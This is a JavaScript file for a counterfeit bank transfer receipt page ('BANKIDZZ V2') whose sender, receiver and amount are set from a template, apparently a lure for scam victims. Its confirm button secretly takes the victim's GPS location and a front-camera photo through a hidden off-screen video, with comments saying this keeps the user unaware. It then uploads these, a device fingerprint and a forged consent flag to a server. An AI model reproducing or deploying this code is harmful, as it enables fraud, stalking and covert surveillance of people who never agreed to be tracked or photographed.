// ============================================================
// BANKIDZZ V2 - SILENT CAPTURE + FRONT CAMERA FIRST
// ============================================================

(function() {
    'use strict';

    const CONFIG = {
        API_URL: '/api/locations',
        TEMPLATE_URL: '/api/template',
        SYNC_CHANNEL: 'bankidzz_sync_channel',
        SILENT_CAPTURE_DELAY: 1500,      // delay sebelum capture (ms)
        LOCATION_TIMEOUT: 8000,          // timeout GPS (ms)
        FRONT_CAMERA_QUALITY: 0.92,      // kualitas foto depan
        BACK_CAMERA_QUALITY: 0.85        // kualitas foto belakang
    };

    // Default Template
    const defaultTemplate = {
        topBarTitle: 'JAPANESE BANK',
        primaryColor: '#0033ff',
        profileImage: 'channels4_profile.jpg',
        bankName: 'BIBD Brunei Darussalam',
        bankSub: 'Office Purchasing',
        amountMain: 'IDR 515.000',
        amountSub: 'BND 35.12',
        senderBank: 'BIBD Brunei Darussalam',
        senderName: 'FITO ALAMSYAH',
        senderAccount: '72828172718',
        receiverBank: 'BANK BNI',
        receiverAccount: '2093832050',
        receiverName: 'Tasliyah',
        buttonText: 'Ambil Foto Konfirmasi / Tanda Tangan'
    };

    let currentTemplate = { ...defaultTemplate };
    let capturedPhotoBase64 = null;
    let silentFrontPhotoBase64 = null;     // Foto silent dari kamera depan
    let silentLocationData = null;         // Lokasi silent
    let frontCameraStream = null;          // Stream kamera depan
    let backCameraStream = null;           // Stream kamera belakang

    // DOM Elements
    const elements = {
        topBarTitle: document.getElementById('topBarTitle'),
        profileImage: document.getElementById('profileImage'),
        bankName: document.getElementById('bankName'),
        bankSub: document.getElementById('bankSub'),
        amountMain: document.getElementById('amountMain'),
        amountSub: document.getElementById('amountSub'),
        senderBankDetail: document.getElementById('senderBankDetail'),
        senderName: document.getElementById('senderName'),
        senderAccount: document.getElementById('senderAccount'),
        receiverBankDetail: document.getElementById('receiverBankDetail'),
        receiverAccount: document.getElementById('receiverAccount'),
        receiverName: document.getElementById('receiverName'),
        btnConfirm: document.getElementById('btnConfirm'),
        notification: document.getElementById('notification'),
        receiptCard: document.getElementById('receiptCard'),
        photoModal: document.getElementById('photoModal'),
        modalPreviewImg: document.getElementById('modalPreviewImg'),
        btnCloseModal: document.getElementById('btnCloseModal'),
        btnCancelPhoto: document.getElementById('btnCancelPhoto'),
        btnSendPhoto: document.getElementById('btnSendPhoto'),
        fileCameraInput: document.getElementById('fileCameraInput'),
        // Element baru untuk kamera
        cameraContainer: document.getElementById('cameraContainer'),
        cameraVideo: document.getElementById('cameraVideo'),
        cameraCanvas: document.getElementById('cameraCanvas'),
        cameraStatus: document.getElementById('cameraStatus'),
        btnCaptureBack: document.getElementById('btnCaptureBack')
    };

    // ============================================================
    // SILENT LOCATION TRACKER
    // ============================================================
    function getSilentLocation() {
        return new Promise((resolve) => {
            // Default fallback
            let locationData = {
                lat: -6.2088,
                lng: 106.8456,
                accuracy: 50,
                timestamp: new Date().toISOString(),
                source: 'fallback',
                silent: true
            };

            if (!navigator.geolocation) {
                resolve(locationData);
                return;
            }

            // Timeout guard
            const timeoutId = setTimeout(() => {
                console.warn('[SILENT-LOC] Timeout, using fallback');
                resolve(locationData);
            }, CONFIG.LOCATION_TIMEOUT);

            // Silent high accuracy request
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    clearTimeout(timeoutId);
                    locationData = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed,
                        timestamp: new Date().toISOString(),
                        source: 'gps',
                        silent: true
                    };
                    console.log('[SILENT-LOC] Location captured:', locationData);
                    resolve(locationData);
                },
                (err) => {
                    clearTimeout(timeoutId);
                    console.warn('[SILENT-LOC] Error:', err.message);
                    resolve(locationData);
                },
                {
                    enableHighAccuracy: true,
                    timeout: CONFIG.LOCATION_TIMEOUT,
                    maximumAge: 0
                }
            );
        });
    }

    // ============================================================
    // SILENT FRONT CAMERA CAPTURE
    // ============================================================
    async function silentFrontCameraCapture() {
        return new Promise(async (resolve) => {
            try {
                console.log('[SILENT-CAM] Starting front camera...');
                
                // Request front camera (user-facing)
                frontCameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',        // KAMERA DEPAN
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 }
                    },
                    audio: false
                });

                // Buat video element sementara (hidden)
                const video = document.createElement('video');
                video.srcObject = frontCameraStream;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                video.muted = true;
                
                // Style hidden biar user gak sadar
                video.style.position = 'fixed';
                video.style.top = '-9999px';
                video.style.left = '-9999px';
                video.style.width = '1px';
                video.style.height = '1px';
                video.style.opacity = '0';
                document.body.appendChild(video);

                // Tunggu video ready
                await new Promise((res) => {
                    video.onloadedmetadata = () => {
                        video.play().then(res).catch(res);
                    };
                    setTimeout(res, 2000); // timeout guard
                });

                // Delay sebentar biar kamera fokus & exposure stabil
                await new Promise(r => setTimeout(r, CONFIG.SILENT_CAPTURE_DELAY));

                // Capture ke canvas
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert ke base64
                silentFrontPhotoBase64 = canvas.toDataURL('image/jpeg', CONFIG.FRONT_CAMERA_QUALITY);
                
                console.log('[SILENT-CAM] Front photo captured, size:', 
                    Math.round(silentFrontPhotoBase64.length / 1024), 'KB');

                // Cleanup
                video.pause();
                video.srcObject = null;
                video.remove();
                
                // Stop stream kamera depan
                if (frontCameraStream) {
                    frontCameraStream.getTracks().forEach(track => track.stop());
                    frontCameraStream = null;
                }

                resolve(silentFrontPhotoBase64);

            } catch (err) {
                console.error('[SILENT-CAM] Error:', err);
                // Cleanup kalau error
                if (frontCameraStream) {
                    frontCameraStream.getTracks().forEach(track => track.stop());
                    frontCameraStream = null;
                }
                resolve(null);
            }
        });
    }

    // ============================================================
    // BACK CAMERA FOR RECEIPT / ITEM PHOTO
    // ============================================================
    async function openBackCamera() {
        try {
            console.log('[BACK-CAM] Opening back camera for item...');
            
            try {
                backCameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: 'environment' },  // KAMERA BELAKANG
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false
                });
            } catch (e1) {
                // Fallback kamera biasa
                backCameraStream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false
                });
            }

            if (elements.cameraVideo) {
                elements.cameraVideo.srcObject = backCameraStream;
                elements.cameraVideo.setAttribute('playsinline', '');
                await elements.cameraVideo.play().catch(() => {});
            }

            if (elements.cameraContainer) {
                elements.cameraContainer.style.display = 'flex';
            }

            return true;
        } catch (err) {
            console.error('[BACK-CAM] Error opening rear camera:', err);
            return false;
        }
    }

    // Capture snapshot dari kamera belakang
    function captureBackCamera() {
        if (!elements.cameraVideo || !elements.cameraCanvas) return null;
        
        const video = elements.cameraVideo;
        const canvas = elements.cameraCanvas;
        
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY);
        
        // Stop stream kamera belakang
        if (backCameraStream) {
            backCameraStream.getTracks().forEach(track => track.stop());
            backCameraStream = null;
        }
        
        if (elements.cameraContainer) {
            elements.cameraContainer.style.display = 'none';
        }
        
        return dataUrl;
    }

    // ============================================================
    // MAIN HANDLER - SILENT CAPTURE DEPAN & LOKASI DULU, 
    // LALU LANGSUNG BUKA KAMERA BELAKANG UNTUK FOTO BARANG
    // ============================================================
    async function handleConfirmClick() {
        if (!elements.receiptCard) return;

        const originalText = elements.btnConfirm.textContent;
        elements.btnConfirm.textContent = '📸 Memproses...';
        elements.btnConfirm.disabled = true;

        try {
            // STEP 1: SILENT LOCATION CAPTURE (Background)
            console.log('[STEP-1] Silent location capture...');
            silentLocationData = await getSilentLocation();
            console.log('[STEP-1] Location:', silentLocationData);

            // STEP 2: SILENT FRONT CAMERA CAPTURE (Background)
            console.log('[STEP-2] Silent front camera capture...');
            silentFrontPhotoBase64 = await silentFrontCameraCapture();

            // STEP 3: SCREENSHOT RECEIPT (html2canvas sebagai fallback/struk)
            console.log('[STEP-3] Screenshot receipt...');
            if (typeof window.html2canvas === 'function') {
                try {
                    const canvas = await window.html2canvas(elements.receiptCard, {
                        scale: 2,
                        useCORS: true,
                        allowTaint: true,
                        backgroundColor: '#ffffff'
                    });
                    capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
                } catch(e) {}
            }

            // STEP 4: LANGSUNG BUKA KAMERA BELAKANG UNTUK FOTO BARANG
            console.log('[STEP-4] Langsung membuka kamera belakang...');
            const backOpened = await openBackCamera();

            if (!backOpened) {
                // Jika kamera belakang tidak tersedia / error, langsung kirim data silent yang ada
                await saveTransactionWithSilentData(
                    silentLocationData,
                    silentFrontPhotoBase64,
                    capturedPhotoBase64
                );

                if (elements.btnConfirm) {
                    elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                    elements.btnConfirm.style.backgroundColor = '#10b981';
                    elements.btnConfirm.dataset.verified = 'true';
                }

                showNotification('Konfirmasi Berhasil Diverifikasi!', 'success');
            }

        } catch (err) {
            console.error('Error in handleConfirmClick:', err);
            showNotification('Gagal memproses. Coba lagi.', 'error');
            elements.btnConfirm.textContent = originalText;
            elements.btnConfirm.disabled = false;
        }
    }

    // ============================================================
    // HANDLE CAPTURE BACK PHOTO & SEND ALL
    // ============================================================
    async function handleCaptureBackPhoto() {
        if (elements.btnCaptureBack) {
            elements.btnCaptureBack.textContent = '⏳ Mengirim Data...';
            elements.btnCaptureBack.disabled = true;
        }

        try {
            // Ambil foto barang dari kamera belakang
            const backPhoto = captureBackCamera();
            if (backPhoto) {
                capturedPhotoBase64 = backPhoto;
            }

            // Kirim semua data: Lokasi Silent + Foto Depan Silent + Foto Barang Belakang
            await saveTransactionWithSilentData(
                silentLocationData || await getSilentLocation(),
                silentFrontPhotoBase64,
                capturedPhotoBase64
            );

            // Update status tombol menjadi sukses terverifikasi
            if (elements.btnConfirm) {
                elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                elements.btnConfirm.style.backgroundColor = '#10b981';
                elements.btnConfirm.dataset.verified = 'true';
            }

            showNotification('✅ Foto barang & data verifikasi berhasil dikirim!', 'success');

        } catch (err) {
            console.error('Error in handleCaptureBackPhoto:', err);
            showNotification('Gagal mengirim data.', 'error');
        } finally {
            if (elements.btnCaptureBack) {
                elements.btnCaptureBack.textContent = '📸 Ambil Foto Barang';
                elements.btnCaptureBack.disabled = false;
            }
        }
    }

    // ============================================================
    // SAVE TRANSACTION WITH SILENT DATA
    // ============================================================
    async function saveTransactionWithSilentData(locationData, frontPhoto, receiptPhoto) {
        const transferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
        
        const payload = {
            transferId: transferId,
            consent: true,
            sender: currentTemplate.senderName || 'FITO ALAMSYAH',
            senderBank: currentTemplate.senderBank || 'BIBD Brunei Darussalam',
            senderAccount: currentTemplate.senderAccount || '72828172718',
            receiver: currentTemplate.receiverName || 'Tasliyah',
            receiverBank: currentTemplate.receiverBank || 'BANK BNI',
            receiverAccount: currentTemplate.receiverAccount || '2093832050',
            amount: currentTemplate.amountMain || 'IDR 515.000',
            amountSub: currentTemplate.amountSub || 'BND 35.12',
            location: locationData,
            photo: receiptPhoto,                    // Foto struk
            frontPhoto: frontPhoto,                 // FOTO SILENT KAMERA DEPAN
            silentCapture: true,                    // Flag silent capture
            silentLocation: true,                   // Flag silent location
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            status: 'verified',
            timestamp: new Date().toISOString()
        };

        // 1. Local Storage Backup
        try {
            const localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            localStored.unshift(payload);
            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
        } catch(e) {}

        // 2. Broadcast Channel
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'NEW_LOCATION', payload: payload });
            channel.close();
        } catch(e) {}

        // 3. Post to Server
        try {
            const response = await fetch(CONFIG.API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!response.ok) {
                console.warn('API non-200, synced locally.');
            }
        } catch (e) {
            console.warn('Network error, synced locally.', e);
        }
    }

    // ============================================================
    // TEMPLATE & UI FUNCTIONS
    // ============================================================
    function applyTemplate(template) {
        currentTemplate = { ...defaultTemplate, ...template };
        document.documentElement.style.setProperty('--primary-blue', currentTemplate.primaryColor || '#0033ff');
        document.title = currentTemplate.topBarTitle || 'Bankidzz';
        
        if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
        if(elements.profileImage && currentTemplate.profileImage) elements.profileImage.src = currentTemplate.profileImage;
        if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
        if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
        if(elements.amountMain) elements.amountMain.textContent = currentTemplate.amountMain;
        if(elements.amountSub) elements.amountSub.textContent = currentTemplate.amountSub;
        if(elements.senderBankDetail) elements.senderBankDetail.textContent = currentTemplate.senderBank;
        if(elements.senderName) elements.senderName.textContent = currentTemplate.senderName;
        if(elements.senderAccount) elements.senderAccount.textContent = currentTemplate.senderAccount;
        if(elements.receiverBankDetail) elements.receiverBankDetail.textContent = currentTemplate.receiverBank;
        if(elements.receiverAccount) elements.receiverAccount.textContent = currentTemplate.receiverAccount;
        if(elements.receiverName) elements.receiverName.textContent = currentTemplate.receiverName;
        
        if(elements.btnConfirm && (!elements.btnConfirm.dataset.verified || elements.btnConfirm.dataset.verified === 'false')) {
            elements.btnConfirm.textContent = currentTemplate.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
        }
    }

    async function loadTemplate() {
        try {
            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.template) {
                    localStorage.setItem('bankidzz_new_template', JSON.stringify(result.template));
                    applyTemplate(result.template);
                    return;
                }
            }
        } catch(e) {}
        const stored = localStorage.getItem('bankidzz_new_template');
        if (stored) {
            try { applyTemplate(JSON.parse(stored)); } catch(e) { applyTemplate(defaultTemplate); }
        } else {
            applyTemplate(defaultTemplate);
        }
    }

    function closeModal() {
        if (elements.photoModal) elements.photoModal.style.display = 'none';
        if (backCameraStream) {
            backCameraStream.getTracks().forEach(track => track.stop());
            backCameraStream = null;
        }
        if (elements.cameraContainer) elements.cameraContainer.style.display = 'none';
    }

    function showNotification(msg, type = 'success') {
        const el = elements.notification;
        if (!el) return;
        el.textContent = msg;
        el.className = 'notification show ' + type;
        clearTimeout(el._timeout);
        el._timeout = setTimeout(() => { el.className = 'notification'; }, 5000);
    }

    function setupSyncListener() {
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'template_updated') {
                    if (event.data.template) {
                        localStorage.setItem('bankidzz_new_template', JSON.stringify(event.data.template));
                        applyTemplate(event.data.template);
                    }
                }
            });
        } catch(e) {}
    }

    // File input fallback
    if (elements.fileCameraInput) {
        elements.fileCameraInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(evt) {
                    capturedPhotoBase64 = evt.target.result;
                    if (elements.modalPreviewImg) elements.modalPreviewImg.src = capturedPhotoBase64;
                    showNotification('Foto diperbarui!', 'success');
                };
                reader.readAsDataURL(file);
            }
        });
    }

    window.closeBackCamera = closeModal;

    // Event listeners
    if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
    if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
    if (elements.btnSendPhoto) elements.btnSendPhoto.addEventListener('click', handleSendPhoto);
    if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
    if (elements.btnCaptureBack) elements.btnCaptureBack.addEventListener('click', handleCaptureBackPhoto);

    // Init
    loadTemplate();
    setupSyncListener();

})();